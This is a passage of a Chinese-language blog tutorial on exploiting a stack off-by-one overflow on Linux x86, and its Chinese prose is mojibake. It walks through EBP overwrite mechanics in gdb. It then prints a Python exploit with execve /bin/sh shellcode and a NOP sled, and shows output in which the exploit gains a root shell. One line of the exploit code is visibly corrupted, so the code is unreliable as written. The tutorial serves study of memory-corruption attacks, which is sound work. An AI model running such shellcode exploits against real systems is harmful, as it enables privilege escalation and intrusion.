<p>ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™çš„èµ·å§‹ç«¯ä¸­æ‰¾åˆ°åç§»é‡ã€‚æˆ‘ä»¬è¿˜éœ€è®¾ç½®å¥½è¿”å›åœ°å€ã€‚åˆ‡è®°ï¼Œåœ¨off-by-oneæ¼æ´ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸æ˜¯è¦è¦†ç›–æ ˆä¸­çš„å®é™…è¿”å›åœ°å€ï¼ˆåœ¨æ ˆç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨ä»£ç ä¸­æˆ‘ä»¬æ‰è¦†ç›–å®é™…è¿”å›åœ°å€ï¼‰ï¼Œè€Œæ˜¯æŠŠæ”»å‡»è€…æ§åˆ¶çš„ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™å†…çš„ä¸€ä¸ª4å­—èŠ‚å†…å­˜åŒºåŸŸè§†ä½œè¿”å›åœ°å€ä½ç½®ï¼Œå¯¹è¿™å—åŒºåŸŸè¿›è¡Œè¦†ç›–ï¼ˆåœ¨off-by-oneæº¢å‡ºä¹‹åï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦(ä»â€˜bufâ€™ä¸­)æ‰¾åˆ°è¿™ä¸ªè¿”å›åœ°å€ä½ç½®çš„åç§»é‡â€”â€”è€Œè¿™ä¸ªåç§»é‡ä¹Ÿæ˜¯ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™æœ¬èº«çš„ä¸€éƒ¨åˆ†ã€‚<br>è¿™æ®µè¯æœ‰ç‚¹ç»•ï¼Œæ²¡å…³ç³»ï¼Œç»§ç»­å¾€ä¸‹è¯»å°±å¥½ã€‚<br>æˆ‘ä»¬å…ˆè¯•ç€ä» text æ®µåœ°å€0x0804840å¼€å§‹å°è¯•ç†è§£CPUçš„æ‰§è¡Œï¼š</p>
<ul>
<li>0x08048490 - call strcpy â€“ æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤ä¼šå¯¼è‡´off-by-oneæº¢å‡ºï¼Œå› æ­¤ï¼ˆå‚¨å­˜åœ¨æ ˆåœ°å€0xbffff2ccä¸­çš„ï¼‰fooçš„EBPå€¼å°†ä¼šç”±0xbffff2d8å˜ä¸º0xbffff200ã€‚</li>
<li>0x08048495 - leave - leaveæŒ‡ä»¤é‡Šæ”¾äº†è¿™ä¸ªå‡½æ•°çš„æ ˆç©ºé—´å¹¶ä¸”æ¢å¤äº†EBPã€‚</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">leave: mov ebp, esp;        <span class="comment">//unwind stack space by setting esp to ebp. </span></div><div class="line">       pop ebp;             <span class="comment">//restore ebp</span></div><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff2cc</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0xbffff200 (Overwritten EBP value is now stored in ebp register); esp = 0xbffff2d0</span></div></pre></td></tr></table></figure>
<ul>
<li>0x08048495 - ret - è¿”å›åˆ°fooçš„æŒ‡ä»¤0x08048475ã€‚</li>
<li>0x08048475 - leave - leaveæŒ‡ä»¤é‡Šæ”¾äº†è¿™ä¸ªå‡½æ•°çš„æ ˆç©ºé—´å¹¶ä¸”æ¢å¤äº†EBPã€‚</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff200 (As part of unwinding esp is shifted down instead of up!!)</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0x41414141; esp = 0xbffff204</span></div></pre></td></tr></table></figure>
<ul>
<li>0x08048476 - ret - è¿”å›åˆ°å‚¨å­˜åœ¨ESP (0xbffff204)ä¸­çš„æŒ‡ä»¤ä¸­ã€‚æ­¤æ—¶ESPæŒ‡å‘è¢«æ”»å‡»è€…æ§åˆ¶çš„ç¼“å†²åŒºï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥å›åˆ°ä»»ä½•ä»–æƒ³è¦å®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„åœ°æ–¹ã€‚</li>
</ul>
<p>ç°åœ¨æˆ‘ä»¬å›åˆ°â€œåœ¨ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™ä¸­å¯»æ‰¾è¿”å›åœ°å€çš„åç§»é‡â€çš„æœ€åˆæµ‹è¯•ä¸Šã€‚å¦‚å †æ ˆå¸ƒå±€å›¾æ‰€ç¤ºï¼Œâ€˜bufâ€™ä½äº0xbffff158ï¼Œå¹¶ä¸”ç”±ç´§éšå…¶åçš„CPUæ‰§è¡Œä¸­å¯çŸ¥ï¼Œç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™å†…çš„è¿”å›åœ°å€ä½ç½®æ˜¯0xbffff204ã€‚å› æ­¤ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™ä¸­è¿”å›åœ°å€çš„åç§»é‡æ˜¯0xbffff204 â€“ 0xbffff158 = 0xacï¼Œå› æ­¤ç”¨æˆ·è¾“å…¥â€œAâ€<em>172 + â€œBâ€</em>4 + â€œAâ€*80ï¼Œç”¨â€œBBBBâ€è¦†ç›–äº†EIPã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ cat exp_tst.py </div><div class="line">#exp_tst.py</div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class"><span class="title">from</span> <span class="title">subprocess</span> <span class="title">import</span> <span class="title">call</span></span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class"><span class="title">buf</span> = "<span class="title">A</span>" * 172</span></div><div class="line"><span class="class"><span class="title">buf</span> += "<span class="title">B</span>" * 4</span></div><div class="line"><span class="class"><span class="title">buf</span> += "<span class="title">A</span>" * 80</span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class"><span class="title">print</span> "<span class="title">Calling</span> <span class="title">vulnerable</span> <span class="title">program</span>"</span></div><div class="line"><span class="class"><span class="title">call</span>(["./<span class="title">vuln</span>", <span class="title">buf</span>])</span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class">$ <span class="title">python</span> <span class="title">exp_tst</span>.<span class="title">py</span> </span></div><div class="line"><span class="class"><span class="title">Calling</span> <span class="title">vulnerable</span> <span class="title">program</span></span></div><div class="line"><span class="class">$ <span class="title">sudo</span> <span class="title">gdb</span> -<span class="title">q</span> <span class="title">vuln</span> </span></div><div class="line"><span class="class"><span class="title">Reading</span> <span class="title">symbols</span> <span class="title">from</span> /<span class="title">home</span>/<span class="title">sploitfun</span>/<span class="title">lsploits</span>/<span class="title">new</span>/<span class="title">obo</span>/<span class="title">stack</span>/<span class="title">vuln</span>...(<span class="title">no</span> <span class="title">debugging</span> <span class="title">symbols</span> <span class="title">found</span>)...<span class="title">done</span>.</span></div><div class="line"><span class="class">(<span class="title">gdb</span>) <span class="title">core</span>-<span class="title">file</span> <span class="title">core</span></span></div><div class="line"><span class="class">[<span class="title">New</span> <span class="title">LWP</span> 4055]</span></div><div class="line"><span class="class"><span class="title">warning</span>:</span> Can't read pathname <span class="keyword">for</span> load <span class="built_in">map</span>: Input/output error.</div><div class="line">Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="string">'.</span></div><div class="line">Program terminated with signal 11, Segmentation fault.</div><div class="line">#<span class="number">0</span> <span class="number">0x42424242</span> in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$<span class="number">1</span> = <span class="number">0x42424242</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>ä¸Šè¿°è¾“å‡ºç»“æœæ˜¾ç¤ºï¼Œæ”»å‡»è€…æ§åˆ¶äº†è¿”å›åœ°å€ã€‚æ­¤æ—¶è¿”å›åœ°å€ä½äºbufçš„åç§»(0xac)å¤„ã€‚æœ‰äº†ä¸Šé¢è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºèƒ½å®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´åˆ©ç”¨ç¨‹åºäº†ã€‚</p>
<p><u><em>æ¼æ´åˆ©ç”¨ä»£ç ï¼š</em></u><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class"><span class="title">from</span> <span class="title">subprocess</span> <span class="title">import</span> <span class="title">call</span></span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class">#<span class="title">Spawn</span> <span class="title">a</span> <span class="title">shell</span>. </span></div><div class="line"><span class="class">#<span class="title">execve</span>(/<span class="title">bin</span>/<span class="title">sh</span>) <span class="title">Size</span>- 28 <span class="title">bytes</span>.</span></div><div class="line"><span class="class"><span class="title">scode</span> = "\<span class="title">x31</span>\<span class="title">xc0</span>\<span class="title">x50</span>\<span class="title">x68</span>\<span class="title">x2f</span>\<span class="title">x2f</span>\<span class="title">x73</span>\<span class="title">x68</span>\<span class="title">x68</span>\<span class="title">x2f</span>\<span class="title">x62</span>\<span class="title">x69</span>\<span class="title">x6e</span>\<span class="title">x89</span>\<span class="title">xe3</span>\<span class="title">x50</span>\<span class="title">x89</span>\<span class="title">xe2</span>\<span class="title">x53</span>\<span class="title">x89</span>\<span class="title">xe1</span>\<span class="title">xb0</span>\<span class="title">x0b</span>\<span class="title">xcd</span>\<span class="title">x80</span>\<span class="title">x90</span>\<span class="title">x90</span>\<span class="title">x90</span>"</span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class"><span class="title">ret_addr</span> = 0<span class="title">xbffff218</span></span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class">#<span class="title">endianess</span> <span class="title">conversion</span></span></div><div class="line"><span class="class"><span class="title">def</span> <span class="title">conv</span>(<span class="title">num</span>):</span></div><div class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numturn Address + NOP's + Shellcode + Junk</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">172</span></div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += <span class="string">"\x90"</span> * <span class="number">30</span></div><div class="line">buf += scode</div><div class="line">buf += <span class="string">"A"</span> * <span class="number">22</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure></p>
<p>æ‰§è¡Œä¸Šè¿°æ¼æ´åˆ©ç”¨ç¨‹åºå°†ä¼šè·å–root shellï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>Off-by-oneçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªç‰¹åˆ«è ¢çš„æ¼æ´ï¼Œè€Œä¸”ç¨‹åºå¼€å‘è€…ä¸€ä¸ªè¿™ä¹ˆå°çš„é”™è¯¯ä¹Ÿèƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼Œè¿™ä¹Ÿå¤ªè¯¡å¼‚äº†ã€‚é‚£ä¹ˆï¼Œoff-by-oneæ¼æ´æ˜¯ä¸æ˜¯ä¸€å®šä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå‘¢ï¼Ÿ</p>
<h3 id="0X03-å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ"><a href="#0X03-å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ" class="headerlink" title="0X03 å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ"></a>0X03 å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ</h3><p>ç­”æ¡ˆéå¸¸ç®€å•ã€‚å¦‚æœé‚£æ ·çš„è¯ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨â€œEBPè¦†ç›–â€æ–¹æ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´äº†å‘—ï¼ï¼ˆä¸è¿‡å‘¢ï¼Œæ¯•ç«Ÿè¿™ä¸ªæ¼æ´åœ¨ä»£ç ä¸­æ˜¯ç¡®å®å­˜åœ¨çš„ï¼Œæ‰€ä»¥è‚¯å®šæœ‰å…¶ä»–çš„æ¼æ´åˆ©ç”¨æ–¹æ³•å•¦ã€‚ğŸ˜›ï¼‰</p>
<h3 id="0X04-ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹"><a href="#0X04-ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹" class="headerlink" title="0X04 ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹"></a>0X04 ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹</h3><p><strong>æƒ…å†µ1</strong>ï¼š ä¸€äº›å…¶ä»–çš„æœ¬åœ°å˜é‡å‡ºç°åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> x = <span class="number">10</span>; <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [2] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [3] */</span> </div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure>
<p>å› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤¹åœ¨ç¼“å†²åŒºâ€˜bufâ€™æœ«ç«¯å’ŒEBPä¹‹é—´çš„ä¼šæ˜¯ä¸€ä¸ªæœ¬åœ°å˜é‡ï¼Œè¿™å°±ä¸å…è®¸æˆ‘ä»¬å»è¦†ç›–EBPçš„LSBäº†ã€‚</p>
<p><strong>æƒ…å†µ2</strong>: å¯¹é½ç©ºé—´â€”â€”gccå¯¹é½æ ˆç©ºé—´è¾¹ç•Œé»˜è®¤ä¸º16å­—èŠ‚ã€‚å³åœ¨åˆ›å»ºæ ˆç©ºé—´ä¹‹å‰ï¼ŒESPçš„æœ€åå››ä¸ªå­—èŠ‚å°±è¢«â€˜andâ€™æŒ‡ä»¤æ¸…é›¶äº†ã€‚å…·ä½“å‚è§ä¸‹æ–¹å‡½æ•°åæ±‡ç¼–ä»£ç ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi</div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">and</span> $<span class="number">0xfffffff0</span>,%esp               <span class="comment">//Stack space aligned to 16 byte boundary</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: sub $<span class="number">0x20</span>,%esp                     <span class="comment">//create stack space</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤¹åœ¨ç¼“å†²åŒºâ€˜bufâ€™æœ«ç«¯å’ŒEBPä¹‹é—´çš„ä¼šæ˜¯ä¸€ä¸ªï¼ˆæœ€å¤§ä¸º12å­—èŠ‚çš„ï¼‰å¯¹é½ç©ºé—´ï¼Œè¿™å°±ä¸å…è®¸æˆ‘ä»¬å»è¦†ç›–EBPçš„LSBäº†ã€‚</p>
<p>ç”±äºè¿™ä¸ªåŸå› ï¼Œæˆ‘ä»¬åœ¨ç¼–è¯‘æ¼æ´åˆ©ç”¨ä»£ç (vuln.c)æ—¶æ·»åŠ äº†gccå‚æ•°<strong><em>â€œ-mpreferred-stack-boundary=2â€</em></strong>ã€‚</p>
<p><u><em>æ±‚åŠ©ï¼š</em></u>å¦‚æœåœ¨åˆ›å»ºæ ˆå†…å®¹ä¹‹å‰ESPè¾¹ç•Œå·²ç»å¯¹é½ä¸º16å­—èŠ‚çš„è¯è¯¥æ€ä¹ˆåŠï¼Ÿè¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿ç¨‹åºä»¥gccé»˜è®¤çš„16å­—èŠ‚æ ˆè¾¹ç•Œç¼–è¯‘ï¼ŒæŒ‰ç†æ¥è¯´â€œEBPè¦†ç›–â€æ³•ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„ã€‚ä½†æ˜¯æˆ‘ä¸€ç›´éƒ½å†™ä¸å‡ºæœ‰æ•ˆä»£ç ã€‚åœ¨æˆ‘æ‰€æœ‰çš„è¯•è¿è¡Œç¨‹åºä¸­ï¼Œåˆ›å»ºæ ˆç©ºé—´ä¹‹å‰ï¼ŒESPè¾¹ç•Œéƒ½æ²¡æœ‰å¯¹é½16å­—èŠ‚ã€‚ä½†æ˜¯ä¸ç®¡æˆ‘å¤šä¹ˆå°å¿ƒåœ°åˆ›å»ºæ ˆå†…å®¹ï¼Œgccæ€»æ˜¯ç»™æœ¬åœ°å˜é‡æ·»åŠ é¢å¤–ç©ºé—´ï¼Œè¿™æ ·ESPè¾¹ç•Œå°±ä¸èƒ½å¯¹é½16å­—èŠ‚ã€‚å¦‚æœä»»ä½•äººæœ‰æœ‰æ•ˆä»£ç æˆ–è€…çŸ¥é“ä¸ºä»€ä¹ˆESPæ€»æ˜¯æ— æ³•å¯¹é½ï¼Œéº»çƒ¦å‘Šè¯‰æˆ‘ï¼æ‹œæ‰˜äº†ï¼</p>
<p><u><em>å‚è€ƒæ–‡ç« ï¼š</em></u></p>
<ol>
<li><a href="http://seclists.org/bugtraq/1998/Oct/109" target="_blank" rel="external">http://seclists.org/bugtraq/1998/Oct/109</a> </li>
</ol>
<hr>
<p><strong>è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜</strong>ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€Š<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-æ ˆå†…Off-by-oneæ¼æ´åˆ©ç”¨</a>ã€‹ä¸ä½œè€…ä¿¡æ¯ï¼š<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSecå‡ºå“</a></p>

      
    </div>
    
    
      <footer class="article-footer">
        
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack/">Stack</a></li></ul>

      </footer>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/20161231/returntolibc/" id="article-nav-newer" class="article-nav-link-wrap">
      <div class="article-nav-title"><span>&lt;</span>&nbsp;
        
          Return-to-libcç»•è¿‡NX
        
      </div>
    </a>
  
  
    <a href="/20161230/integerflow/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">æ•´å‹æº¢å‡ºåˆ©ç”¨&nbsp;<span>&gt;</span></div>
    </a>
  
</nav>

  
</article>




<div class="share_addthis">
  <div class="sharing addthis_toolbox share">
    <a class="addthis_button_facebook_like"></a>
    <a class="addthis_button_tweet"></a>
    <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
    <a class="addthis_counter addthis_pill_style"></a>
  </div>
  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-560c64c35486b3d4" async="async"></script>
</div>





</section>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 Diting0x&nbsp;
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a href="http://github.com/ppoffice">PPOffice</a>
    </div>
  </div>
</footer>
    

<script src="/js/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
  </div>
</body>
</html>